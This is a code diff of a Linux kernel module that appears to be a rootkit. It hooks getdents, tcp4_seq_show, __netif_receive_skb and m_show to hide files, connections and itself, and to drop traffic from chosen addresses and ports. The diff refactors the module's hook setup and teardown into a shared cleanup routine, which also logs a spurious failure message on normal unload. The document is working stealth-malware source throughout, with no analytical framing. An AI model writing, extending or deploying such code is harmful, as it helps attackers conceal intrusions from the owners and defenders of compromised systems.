@@ -35,7 +35,6 @@
 #define DROP_SIP "\x08\x08\x08\x08"
 #define DROP_ARP_SIP "\x0a\x00\x00\xfa"
 #define DROP_SPORT 5999
-#define HIDDEN_MOD_NAME "mymod"
 
 #include "hook_functions/tcp_seq_show.c"
 #include "hook_functions/getdents.c"
@@ -43,8 +42,11 @@
 #include "hook_functions/m_show.c"
 
 typedef enum {
-        FAILED_TO_SET_SYSTEM_HOOKS = -1,
-        FAILED_TO_SET_FHOOK_HOOK = -2,
+    SUCCESSFULLY_INSTALLED = 0,
+    FAILED_TO_SET_SYSTEM_HOOKS = -1,
+    FAILED_TO_SET_TCP_FHOOK_HOOK = -2,
+    FAILED_TO_SET_NETIF_FHOOK_HOOK = -3,
+    FAILED_TO_SET_MSHOW_FHOOK_HOOK = -4,
 } ErrorCode;
 
 
@@ -71,48 +73,66 @@ static struct sys_hook sys_hooks[] = {
     },
 };
 
+static void cleanup(ErrorCode error){
+    if (error == FAILED_TO_SET_SYSTEM_HOOKS){
+        printk("failed to set system hooks");
+        return;
+    }
+
+    undo_sys_hooks(sys_hooks, ARRAY_SIZE(sys_hooks));
+    if (error == FAILED_TO_SET_TCP_FHOOK_HOOK){
+        printk("failed to set tcp hook");
+        return;
+    }
+
+    undo_ftrace_hook(&tcp_seq_show_fhook);
+    if (error == FAILED_TO_SET_NETIF_FHOOK_HOOK){
+        printk("failed to set netif hook");
+        return;
+    }
+
+    undo_ftrace_hook(&netif_fhook);
+    printk("failed to set m_show hook");
+    if (error == FAILED_TO_SET_MSHOW_FHOOK_HOOK){
+        return;
+    }
+    
+    undo_ftrace_hook(&m_show_fhook);
+}
+
 int init_module(void)
 {
     int res = 0;
 
     res = set_sys_hooks(sys_hooks, ARRAY_SIZE(sys_hooks));
     if (res != 0){
-        printk("failed to set system hooks");
+        cleanup(FAILED_TO_SET_SYSTEM_HOOKS);
         return FAILED_TO_SET_SYSTEM_HOOKS;
     }
 
     res = set_ftrace_hook("tcp4_seq_show", &tcp_seq_show_fhook);
     if (res != 0){
-        printk("failed to set tcp hook");
-        undo_sys_hooks(sys_hooks, ARRAY_SIZE(sys_hooks));
-        return FAILED_TO_SET_FHOOK_HOOK;
+        cleanup(FAILED_TO_SET_TCP_FHOOK_HOOK);
+        return FAILED_TO_SET_TCP_FHOOK_HOOK;
     }
 
     res = set_ftrace_hook("__netif_receive_skb", &netif_fhook);
     if (res != 0){
-        printk("failed to set netif hook");
-        undo_ftrace_hook(&tcp_seq_show_fhook);
-        undo_sys_hooks(sys_hooks, ARRAY_SIZE(sys_hooks));
-        return FAILED_TO_SET_FHOOK_HOOK;
+        cleanup(FAILED_TO_SET_NETIF_FHOOK_HOOK);
+        return FAILED_TO_SET_NETIF_FHOOK_HOOK;
     }
 
     res = set_ftrace_hook("m_show", &m_show_fhook);
     if (res != 0){
-        printk("failed to set m_show hook");
-        undo_ftrace_hook(&tcp_seq_show_fhook);
-        undo_ftrace_hook(&netif_fhook);
-        undo_sys_hooks(sys_hooks, ARRAY_SIZE(sys_hooks));
-        return FAILED_TO_SET_FHOOK_HOOK;
+        cleanup(FAILED_TO_SET_MSHOW_FHOOK_HOOK);
+        return FAILED_TO_SET_MSHOW_FHOOK_HOOK;
     }
-    return 0;
+    return SUCCESSFULLY_INSTALLED;
 }
 
-void cleanup_module(void) 
-{
-    undo_sys_hooks(sys_hooks, ARRAY_SIZE(sys_hooks));
-    undo_ftrace_hook(&tcp_seq_show_fhook);
-    undo_ftrace_hook(&netif_fhook);
-    undo_ftrace_hook(&m_show_fhook);
+void cleanup_module(void)
+{    
+    cleanup(SUCCESSFULLY_INSTALLED);
 }
 
 MODULE_LICENSE("GPL");
